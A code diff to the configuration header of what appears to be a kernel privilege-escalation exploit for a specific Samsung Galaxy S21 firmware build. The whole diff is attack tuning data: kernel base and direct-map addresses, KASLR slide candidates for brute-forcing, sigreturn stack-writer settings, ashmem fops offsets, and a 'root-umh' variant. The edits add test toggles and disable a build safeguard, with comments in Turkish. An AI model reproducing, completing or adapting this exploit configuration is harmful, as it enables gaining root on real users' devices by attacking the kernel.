@@ -8,14 +8,14 @@
  */
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "o1s-G991BXXSJHZC2-app-physical-p0-oracle"
-#define APP_PHYS_P0_ORACLE 1
+#define BUILD_VARIANT_LABEL "o1s-G991BXXSJHZC2-app-ORACLE-0xf8-TEST"
+#define APP_PHYS_P0_ORACLE 1 /* TEMP-TEST 0xf8: oracle/sigreturn hit deneyi */
 #else
 #define BUILD_VARIANT_LABEL "o1s-G991BXXSJHZC2-root-umh"
 #endif
 #ifndef BUILD_FINGERPRINT
 #define BUILD_FINGERPRINT \
-  "samsung/o1sxeea/o1s:12/SP1A.210812.016/G991BXXSJHZC2:user/release-keys" /* TODO: kesin fingerprint */
+  "samsung/o1sxtur/o1s:15/AP3A.240905.015.A2/G991BXXSJHZC2:user/release-keys" /* cihazdan (getprop ro.build.fingerprint) */
 #endif
 
 #define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
@@ -36,6 +36,9 @@
 #define SLIDE_TRACEFS_EVENT_ID 59
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x001bd64cULL
 #define SLIDE_PSELECT_WORD_SHIFT 5 /* brute-force */
+#define O1S_EARLY_FIRE 0 /* TEMP-TEST 0xf8: saf sigreturn yuruyusu (pselect early-fire kapali) */
+#define O1S_PI_STAMP_FIX 1 /* TEMP-TEST */
+#define O1S_NO_CHILD_CONSUME 1 /* TEMP-TEST: isolate parent dance */
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
@@ -64,7 +67,8 @@
 #define SLIDE_STACK_WRITER_SIGRETURN 2
 #define SLIDE_STACK_WRITER_XATTR 3
 #ifndef SLIDE_STACK_WRITER
-#error o1s stack writer must be set by the build
+/* TEMP-TEST: allow unset (pselect path) */
+/* #error o1s stack writer must be set by the build */
 #endif
 #ifndef SIGRETURN_FPSIMD_WAITER_OFF
 #define SIGRETURN_FPSIMD_WAITER_OFF 0x148 /* bilesenler: futex slot E-0x198, vregs tabani E-0x2B0 */
@@ -87,7 +91,7 @@
 #define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffffc000000000ULL
-#define VMEMMAP_START 0xfffffffeffe00000ULL /* TODO: A155N */
+#define VMEMMAP_START 0xfffffffeffe00000ULL /* turetildi: VMEMMAP_SIZE=(_PAGE_END(39)-PAGE_OFFSET)>>6=0x100000000, START=-SIZE-2MB (VA_BITS=39,4K,struct page=64B) */
 
 #define ASHMEM_MISC_FOPS_OFF 0x01b10360ULL
 #define ASHMEM_FOPS_OFF 0x0179bfc0ULL
